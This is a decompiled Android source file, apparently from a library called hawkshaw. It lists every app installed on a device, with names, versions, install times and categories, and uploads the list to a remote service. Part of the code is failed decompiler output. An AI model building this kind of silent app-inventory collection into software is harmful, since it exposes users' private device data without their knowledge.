package com.hawkshaw.library.features.misc;

import Y1.K;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import com.hawkshaw.library.datalayer.models.InstalledApp;
import java.util.ArrayList;
import java.util.List;

public final class InstalledAppListKt {
    private static final String TAG = "InstalledAppList";

    private static final ArrayList<InstalledApp> getInstalledAppList(Context context) {
        PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> installedPackages = packageManager.getInstalledPackages(128);
        K.m(installedPackages, "getInstalledPackages(...)");
        ArrayList<InstalledApp> arrayList = new ArrayList<>();
        for (PackageInfo next : installedPackages) {
            if (next != null) {
                String obj = next.applicationInfo.loadLabel(packageManager).toString();
                String str = next.packageName;
                K.m(str, "packageName");
                String str2 = next.versionName;
                long b5 = Build.VERSION.SDK_INT >= 28 ? next.getLongVersionCode() : (long) next.versionCode;
                long j5 = next.firstInstallTime;
                ApplicationInfo applicationInfo = next.applicationInfo;
                arrayList.add(new InstalledApp(obj, str, str2, b5, j5, (applicationInfo.flags & 129) != 0, toCategory(applicationInfo.category), next.applicationInfo.enabled));
            }
        }
        return arrayList;
    }

    /* JADX WARNING: type inference failed for: r0v3, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x002f  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushInstalledAppList(android.content.Context r6, a3.e r7) {
        /*
            boolean r0 = r7 instanceof Q1.b
            if (r0 == 0) goto L_0x0013
            r0 = r7
            Q1.b r0 = (Q1.b) r0
            int r1 = r0.f1787E
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1787E = r1
            goto L_0x0018
        L_0x0013:
            Q1.b r0 = new Q1.b
            r0.<init>(r7)
        L_0x0018:
            java.lang.Object r7 = r0.f1786D
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1787E
            r3 = 1
            if (r2 == 0) goto L_0x002f
            if (r2 != r3) goto L_0x0027
            Y1.C0110h.P(r7)
            goto L_0x004e
        L_0x0027:
            java.lang.IllegalStateException r6 = new java.lang.IllegalStateException
            java.lang.String r7 = "call to 'resume' before 'invoke' with coroutine"
            r6.<init>(r7)
            throw r6
        L_0x002f:
            Y1.C0110h.P(r7)
            java.util.ArrayList r6 = getInstalledAppList(r6)
            com.hawkshaw.library.datalayer.Injector$Companion r7 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r7 = r7.getInstance()
            com.hawkshaw.library.datalayer.network.service.MiscService r7 = r7.getMiscService()
            com.hawkshaw.library.datalayer.models.PushInstalledAppListRequest r2 = new com.hawkshaw.library.datalayer.models.PushInstalledAppListRequest
            r2.<init>(r6)
            r0.f1787E = r3
            java.lang.Object r7 = r7.pushInstalledAppList(r2, r0)
            if (r7 != r1) goto L_0x004e
            return r1
        L_0x004e:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r7 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r7
            com.hawkshaw.library.logger.Logger r0 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r6 = r7.getState()
            java.lang.String r1 = "PushInstalledAppList: "
            java.lang.String r2 = i.C0528x.h(r1, r6)
            r4 = 4
            r5 = 0
            java.lang.String r1 = "InstalledAppList"
            r3 = 0
            com.hawkshaw.library.logger.Logger.d$default(r0, r1, r2, r3, r4, r5)
            return r7
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.misc.InstalledAppListKt.pushInstalledAppList(android.content.Context, a3.e):java.lang.Object");
    }

    private static final InstalledApp.Category toCategory(int i5) {
        switch (i5) {
            case -1:
                return InstalledApp.Category.UNDEFINED;
            case 0:
                return InstalledApp.Category.GAME;
            case 1:
                return InstalledApp.Category.AUDIO;
            case 2:
                return InstalledApp.Category.VIDEO;
            case 3:
                return InstalledApp.Category.IMAGE;
            case 4:
                return InstalledApp.Category.SOCIAL;
            case 5:
                return InstalledApp.Category.NEWS;
            case 6:
                return InstalledApp.Category.MAPS;
            case 7:
                return InstalledApp.Category.PRODUCTIVITY;
            case 8:
                return InstalledApp.Category.ACCESSIBILITY;
            default:
                return InstalledApp.Category.UNDEFINED;
        }
    }
}
